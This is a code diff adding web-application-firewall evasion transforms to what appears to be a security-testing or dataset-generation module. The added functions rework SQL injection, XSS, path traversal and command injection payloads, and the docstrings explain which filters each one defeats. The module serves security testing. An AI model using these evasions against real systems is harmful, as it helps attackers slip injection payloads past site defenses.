@@ -32,6 +32,7 @@ from __future__ import annotations
 
 import json
 import random
+import re
 import urllib.parse
 from collections.abc import Callable, Iterator
 from dataclasses import dataclass
@@ -116,12 +117,130 @@ def html_entity_split(payload: str) -> str:
     return "".join(f"&#{ord(c)};" if c.isalpha() else c for c in payload)
 
 
+def sql_char_concat(payload: str) -> str:
+    """Rebuild a quoted string as ``CHAR(n)`` concatenation -- defeats a
+    signature keyed on the literal quote character, since the string never
+    appears quoted in the request; the DBMS reassembles it from character
+    codes at execution time."""
+    codes = ",".join(str(ord(c)) for c in payload if c not in "'\"")
+    return f"CHAR({codes})" if codes else payload
+
+
+def versioned_comment_wrap(payload: str) -> str:
+    """MySQL version-gated comment (``/*!50000 ... */``) around the payload
+    -- a WAF that strips balanced ``/* */`` comments outright removes the
+    delimiters and the keyword inside becomes visible again, but a MySQL
+    server executes the content unconditionally (the ``!NNNNN`` gate only
+    ever *adds* a version floor, never hides the statement from the engine)."""
+    return f"/*!00000{payload}*/" if payload else payload
+
+
+def svg_tag_vector(payload: str) -> str:
+    """Swap an assumed ``<script>``/``<img>`` vector for ``<svg onload=...>``
+    -- defeats a signature keyed on the ``script`` tag name; the browser
+    fires ``onload`` on any SVG element with no user interaction needed.
+    Pulls the JS call out of whatever tag shape the base payload used
+    (``alert(...)`` in this corpus's canary payloads) so the result is a
+    well-formed tag regardless of the input's original vector."""
+    match = re.search(r"[A-Za-z_][\w.]*\([^)]*\)", payload)
+    js_call = match.group(0) if match else "alert(1)"
+    return f"<svg/onload={js_call}>"
+
+
+def whitespace_tag_split(payload: str) -> str:
+    """Insert a tab inside the opening tag name (``<scr\\tipt>``) -- HTML5's
+    tokenizer still recognises the tag (whitespace inside a tag name is
+    dropped during parsing) while a regex anchored on the contiguous literal
+    ``<script`` no longer matches."""
+    return payload.replace("<script", "<scr\tipt", 1) if "<script" in payload else payload
+
+
+def backslash_traversal_mix(payload: str) -> str:
+    """Alternate ``/`` and ``\\`` across traversal segments -- a filter that
+    only normalises one separator style (common on stacks ported from a
+    single OS assumption) leaves the mixed-separator path untouched, while
+    the Windows path layer still walks up a directory on either character."""
+    segments = payload.split("/")
+    if len(segments) < 2:
+        return payload
+    seps = ["\\" if i % 2 == 0 else "/" for i in range(len(segments) - 1)]
+    out = [segments[0]]
+    for segment, sep in zip(segments[1:], seps, strict=True):
+        out.append(sep)
+        out.append(segment)
+    return "".join(out)
+
+
+def null_byte_truncate(payload: str) -> str:
+    """Trailing ``%00`` (URL-encoded NUL) -- on a stack that still passes the
+    raw byte to a C string API (legacy PHP `` <5.3.4``, some native file
+    handlers), the interpreter truncates the string at the NUL, discarding an
+    appended allow-listed extension the application code checks for."""
+    return f"{payload}%00"
+
+
+def newline_command_split(payload: str) -> str:
+    """URL-encoded newline (``%0a``) instead of ``;``/``|`` as the command
+    separator -- a filter denylisting the common shell metacharacters misses
+    the newline, which every POSIX shell still honours as a statement
+    terminator."""
+    for sep in (";", "|", "&&"):
+        payload = payload.replace(sep, "%0a")
+    return payload
+
+
+def backtick_substitution(payload: str) -> str:
+    """Backtick command substitution in place of ``$(...)`` -- a filter
+    written against the ``$(`` token misses the older, functionally
+    identical backtick form; every POSIX shell evaluates both the same way."""
+    inner = payload.strip()
+    if inner.startswith("$(") and inner.endswith(")"):
+        inner = inner[2:-1]
+    return f"`{inner}`"
+
+
+def chain(*fns: Callable[[str], str]) -> Callable[[str], str]:
+    """Compose techniques left-to-right into one encoder.
+
+    Real WAF-evasion practice rarely stops at one transform -- an operator
+    re-encodes the *output* of a blocked technique again once that form is
+    also caught. The composed callable is a normal, pure function so it
+    slots into ``EVASION_TECHNIQUES`` / ``_TECHNIQUE_NOTE`` like any atomic
+    technique above.
+    """
+    def _chained(payload: str) -> str:
+        for fn in fns:
+            payload = fn(payload)
+        return payload
+    return _chained
+
+
+# Chained (multi-stage) techniques -- defined once at import time so each is
+# a stable dict key, matching the atomic techniques above.
+sqli_hex_then_nested = chain(hex_literal_sqli, nested_url_encode)
+xss_svg_then_unicode = chain(svg_tag_vector, unicode_escape)
+pathtraver_overlong_then_null = chain(overlong_utf8_traversal, null_byte_truncate)
+cmdi_ifs_then_newline = chain(ifs_substitution, newline_command_split)
+
+
 # vclass (matches ai_module.structured_inference.VulnClass values) -> techniques
 EVASION_TECHNIQUES: dict[str, list[Callable[[str], str]]] = {
-    "sqli": [nested_url_encode, hex_literal_sqli, inline_comment_split, case_toggle],
-    "xss": [nested_url_encode, unicode_escape, html_entity_split, case_toggle],
-    "pathtraver": [nested_url_encode, overlong_utf8_traversal],
-    "cmdi": [nested_url_encode, ifs_substitution, base64_shell_wrap],
+    "sqli": [
+        nested_url_encode, hex_literal_sqli, inline_comment_split, case_toggle,
+        sql_char_concat, versioned_comment_wrap, sqli_hex_then_nested,
+    ],
+    "xss": [
+        nested_url_encode, unicode_escape, html_entity_split, case_toggle,
+        svg_tag_vector, whitespace_tag_split, xss_svg_then_unicode,
+    ],
+    "pathtraver": [
+        nested_url_encode, overlong_utf8_traversal, backslash_traversal_mix,
+        null_byte_truncate, pathtraver_overlong_then_null,
+    ],
+    "cmdi": [
+        nested_url_encode, ifs_substitution, base64_shell_wrap,
+        newline_command_split, backtick_substitution, cmdi_ifs_then_newline,
+    ],
 }
 
 _TECHNIQUE_NOTE: dict[Callable[[str], str], str] = {
@@ -134,6 +253,18 @@ _TECHNIQUE_NOTE: dict[Callable[[str], str], str] = {
     ifs_substitution: "${IFS} substitution for whitespace",
     base64_shell_wrap: "base64-wrapped shell payload",
     html_entity_split: "decimal HTML-entity encoding",
+    sql_char_concat: "CHAR()-concatenation string reconstruction",
+    versioned_comment_wrap: "MySQL version-gated comment wrapping",
+    svg_tag_vector: "alternate SVG-tag XSS vector",
+    whitespace_tag_split: "whitespace-split tag name",
+    backslash_traversal_mix: "mixed forward/backslash traversal separators",
+    null_byte_truncate: "trailing NUL-byte truncation",
+    newline_command_split: "newline command separator substitution",
+    backtick_substitution: "backtick command substitution",
+    sqli_hex_then_nested: "SQL hex-literal encoding, then nested percent-encoding",
+    xss_svg_then_unicode: "SVG-tag vector, then per-character Unicode escapes",
+    pathtraver_overlong_then_null: "overlong UTF-8 path separators, then trailing NUL truncation",
+    cmdi_ifs_then_newline: "${IFS} whitespace substitution, then newline separator substitution",
 }
 
 # category file -> vclass, matching ai_module.dataset_generator._TESTER_TO_CATEGORY
